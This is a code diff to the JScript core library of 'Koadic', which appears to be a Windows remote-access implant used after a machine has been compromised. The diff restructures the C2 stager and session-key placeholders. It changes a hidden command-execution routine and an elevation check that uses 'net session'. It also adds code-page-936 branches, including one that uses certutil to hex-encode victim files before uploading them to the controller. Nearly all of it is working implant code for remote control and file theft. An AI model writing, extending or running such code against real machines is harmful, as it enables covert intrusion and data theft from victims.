@@ -1,15 +1,12 @@
-var Koadic =
-{
-    FS : new ActiveXObject("Scripting.FileSystemObject"),
-    WS : new ActiveXObject("WScript.Shell"),
+var Koadic = {};
 
-    STAGER : "~URL~",
-    SESSIONKEY : "~SESSIONKEY~",
-    JOBKEY : "~JOBKEY~",
-    JOBKEYPATH : "~URL~?~SESSIONNAME~=~SESSIONKEY~;~JOBNAME~=",
-    EXPIRE : "~_EXPIREEPOCH_~"
-
-};
+Koadic.FS = new ActiveXObject("Scripting.FileSystemObject");
+Koadic.WS = new ActiveXObject("WScript.Shell");
+Koadic.STAGER = "~URL~";
+Koadic.SESSIONKEY = "~SESSIONKEY~";
+Koadic.JOBKEY = "~JOBKEY~";
+Koadic.JOBKEYPATH = "~URL~?~SESSIONNAME~=~SESSIONKEY~;~JOBNAME~=";
+Koadic.EXPIRE = "~_EXPIREEPOCH_~";
 
 /**
  * Sleeps the current thread
@@ -131,8 +128,8 @@ Koadic.user.isElevated = function()
 {
     try
     {
-        var res = Koadic.shell.exec("net session", "%TEMP%\\"+Koadic.uuid()+".txt")
-        if (res.indexOf("Access is denied.") == -1)
+        var res = Koadic.shell.exec("(net session || echo unelevated)", "%TEMP%\\"+Koadic.uuid()+".txt");
+        if (res.indexOf("unelevated") == -1)
         {
             return true;
         }
@@ -566,14 +563,21 @@ Koadic.http.upload = function(filepath, header_uuid, header_key)
 {
     var key = (typeof(header_key) !== "undefined") ? header_key : "ETag";
 
-    var data = Koadic.file.readBinary(filepath);
-
-    // we must replace null bytes or MS will cut off the body
-    data = data.replace(/\\/g, "\\\\");
-    data = data.replace(/\0/g, "\\0");
-
     var headers = {};
     headers[key] = header_uuid;
+
+    var data = Koadic.file.readBinary(filepath);
+
+    if (Koadic.user.encoder() == "936")
+    {
+        // do nothing
+    }
+    else
+    {
+        // we must replace null bytes or MS will cut off the body
+        data = data.replace(/\\/g, "\\\\");
+        data = data.replace(/\0/g, "\\0");
+    }
 
     return Koadic.work.report(data, headers);
 }
@@ -870,7 +874,14 @@ Koadic.shell.exec = function(cmd, stdOutPath)
     var c = "%comspec% /q /c " + cmd + " 1> " + Koadic.file.getPath(stdOutPath);
     c += " 2>&1";
     Koadic.WS.Run(c, 0, true);
-    var data = Koadic.file.readBinary(stdOutPath);
+    if (Koadic.user.encoder() == "936")
+    {
+        var data = Koadic.file.readText(stdOutPath);
+    }
+    else
+    {
+        var data = Koadic.file.readBinary(stdOutPath);
+    }
     Koadic.file.deleteFile(stdOutPath);
 
     return data;
@@ -938,10 +949,20 @@ Koadic.file.readBinary = function(path)
     {
         if (Koadic.FS.FileExists(Koadic.file.getPath(path)) && Koadic.FS.GetFile(Koadic.file.getPath(path)).Size > 0)
         {
-            var fp = Koadic.FS.GetFile(Koadic.file.getPath(path));
-            var fd = fp.OpenAsTextStream();
-            var data = fd.read(fp.Size);
-            fd.close();
+            if (Koadic.user.encoder() == "936")
+            {
+                var newout = "%TEMP%\\"+Koadic.uuid()+".txt";
+                Koadic.shell.run("certutil -encodehex "+Koadic.file.getPath(path)+" "+newout);
+                var data = Koadic.file.readText(newout);
+                Koadic.file.deleteFile(newout);
+            }
+            else
+            {
+                var fp = Koadic.FS.GetFile(Koadic.file.getPath(path));
+                var fd = fp.OpenAsTextStream();
+                var data = fd.read(fp.Size);
+                fd.close();
+            }
             return data;
         }
         else
@@ -970,4 +991,3 @@ Koadic.file.deleteFile = function(path)
     Koadic.FS.DeleteFile(Koadic.file.getPath(path), true);
 };
 //file.deleteFile.end
-
